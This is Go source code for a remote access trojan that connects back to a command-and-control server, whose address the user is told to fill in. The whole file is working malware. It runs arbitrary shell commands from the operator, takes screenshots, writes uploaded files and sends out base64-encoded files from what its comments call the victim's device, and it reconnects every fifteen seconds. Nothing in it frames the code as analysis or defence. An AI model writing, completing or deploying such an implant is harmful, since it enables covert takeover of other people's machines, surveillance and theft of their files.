// Author : Nemuel Wainaina

package main

import (
	"bufio"
	b64 "encoding/base64"
	"fmt"
	"image/png"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/kbinani/screenshot"
)

const (
	// replace the C2 variable with your C2 IP and port to connect to
	C2 string = "127.0.0.1:54321"
)

func main() {
	conn, _ := connect_home()

	for {
		msg, _ := bufio.NewReader(conn).ReadString('\n')
		cmd := strings.TrimSpace(string(msg))

		if cmd == "q" || cmd == "quit" {
			send_resp(conn, "Closing connection")
			conn.Close()
		} else if cmd[0:2] == "cd" {
			if cmd == "cd" {
				result, err := os.Getwd()
				if err != nil {
					send_resp(conn, err.Error())
				} else {
					send_resp(conn, result)
				}
			} else {
				tgt_dir := strings.Split(cmd, " ")[1]
				if err := os.Chdir(tgt_dir); err != nil {
					send_resp(conn, err.Error())
				} else {
					send_resp(conn, fmt.Sprintf("Dir changed successfully to %s", tgt_dir))
				}
			}
		} else if cmd == "capturescr" {
			result := take_screenshot()
			send_resp(conn, fmt.Sprintf("img:%s", result))
		} else if strings.Split(cmd, ":")[0] == "file" {
			// receiving file from C2
			tmp := strings.Split(cmd, ":")
			b64_string := tmp[1]
			file_name := tmp[2]
			if !save_file(file_name, b64_string) {
				send_resp(conn, fmt.Sprintf("Failed to save %s", file_name))
			} else {
				send_resp(conn, fmt.Sprintf("%s saved successfully", file_name))
			}
		} else if strings.Split(cmd, " ")[0] == "download" { 
			tgt_file := strings.Split(cmd, " ")[1]
			result := get_file(tgt_file)
			send_resp(conn, result)
		} else {
			send_resp(conn, exec_cmd(cmd))
		}
	}
}

func connect_home() (net.Conn, error) {
	conn, err := net.Dial("tcp", C2)
	if err != nil {
		time.Sleep(15e9)
		connect_home()
	}
	return conn, err
}

// send the response back to the C2Server
func send_resp(conn net.Conn, resp string) {
	fmt.Fprintf(conn, "%s\n", resp)
}

// execute a shell command and return the result
func exec_cmd(cmd string) string {
	result, err := exec.Command(cmd).Output()
	if err != nil {
		return err.Error()
	} else {
		return string(result)
	}
}

// check whether or not a file exists
func file_exists(file string) (bool) {
	if _, err := os.Stat(file); err != nil {
		return false
	} else {
		return true
	}
}

// return the base64 encoding of a file on victim's device
func get_file(file string) (string) {
	if !file_exists(file) {
		return "File not found"
	} 
	content, _ := os.ReadFile(file)
	b64_string := b64.StdEncoding.EncodeToString(content)
	return b64_string
}

// save the uploaded file to victim's device
func save_file(file string, b64_string string) (bool) {
	content, _ := b64.StdEncoding.DecodeString(b64_string)
	if err := os.WriteFile(file, content, 0644); err != nil {
		return false
	} else {
		return true
	}
}

// take a screenshot, return its base64 value and then clean up
func take_screenshot() (string) {
	bnds := screenshot.GetDisplayBounds(0)
	img, _ := screenshot.CaptureRect(bnds)
	file, _ := os.Create("scrshot.png")
	defer file.Close()
	png.Encode(file, img)
	content, _ := os.ReadFile("scrshot.png")
	b64_string := b64.StdEncoding.EncodeToString(content)
	os.Remove("scrshot.png")
	return b64_string
}